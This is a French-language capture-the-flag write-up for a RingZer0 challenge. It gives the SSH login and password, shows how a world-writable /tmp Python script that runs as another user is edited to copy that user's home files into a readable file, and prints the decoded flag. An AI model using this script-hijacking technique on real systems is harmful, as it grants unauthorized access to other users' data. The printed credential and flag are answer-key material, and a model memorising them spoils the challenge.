ssh morpheus@challenges.ringzer0ctf.com -p 10147

Mot de passe: VNZDDLq2x9qXCzVdABbR1HOtz

En faisant ps -aux

on remarque ceci :
root     3116343  0.0  0.0  11008   444 ?        S    Aug24   0:00 su cypher -c python /tmp/Gathering.py
Puis ca coincide un peu avec l'indice du challenge parlant de cypher ...


cat /tmp/Gathering.py
import os
os.system('ps aux > /tmp/28JNvE05KBltE8S7o2xu')


Mais ce fichier est modifiable pour moi via vim
vim /tmp/28JNvE05KBltE8S7o2xu

Puis comme moi je ne peux pas lire 28JNvE05KBltE8S7o2xu je vais juste créer un fichier qui pourra lire et écrire peut importe la personne.


umask 000
touch /tmp/my_ps_aux_file


Vérifie ensuite que les droits lectures et écritures sont ok pour tous ... (on ne peut pas utiliser chmod ici d'où mon umask)

Bon là je vais changer le fichier python avec vim pour ceci :
import os
os.system('cat /home/cypher/*.* > /tmp/my_ps_aux_file')

Je me disais qu'il fallait modifier ce fichier mais j'voyais rien après un petit temps ...

Bon je croyais qu'un cronjob roulait puis j'avais raison avec le temps même si je n'ai pas pu le prouver, j'ai vu que mon fichier s'était rempli:
BASE ?
RkxBRy0wY2ZjMzM5MGEwODJhMjJmZGQ3NjNmNDQyNmY0MzI5Ng==
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  10656   664 ?        Ss   Jan14   1:04 init [2]  
root         2  0.0  0.0      0     0 ?        S    Jan14   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    Jan14   1:36 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    Jan14   0:00 [kworker/u:0]
root         6  0.0  0.0      0     0 ?        S    Jan14   0:00 [migration/0]
root         7  0.0  0.0      0     0 ?        S    Jan14   0:35 [watchdog/0]
root         8  0.0  0.0      0     0 ?        S<   Jan14   0:00 [cpuset]
root         9  0.0  0.0      0     0 ?        S<   Jan14   0:00 [khelper]
root        10  0.0  0.0      0     0 ?        S    Jan14   0:00 [kdevtmpfs]
root        11  0.0  0.0      0     0 ?        S<   Jan14   0:00 [netns]
root        12  0.0  0.0      0     0 ?        S    Jan14   0:16 [sync_supers]
root        13  0.0  0.0      0     0 ?        S    Jan14   0:00 [bdi-default]
root        14  0.0  0.0      0     0 ?        S<   Jan14   0:00 [kintegrityd]
root        15  0.0  0.0      0     0 ?        S<   Jan14   0:00 [kblockd]
root        16  0.0  0.0      0     0 ?        S    Jan14   0:02 [khungtaskd]
root        17  0.0  0.0      0     0 ?        S    Jan14   0:05 [kswapd0]
...

echo RkxBRy0wY2ZjMzM5MGEwODJhMjJmZGQ3NjNmNDQyNmY0MzI5Ng== | base64 --decode
FLAG-0cfc3390a082a22fdd763f4426f43296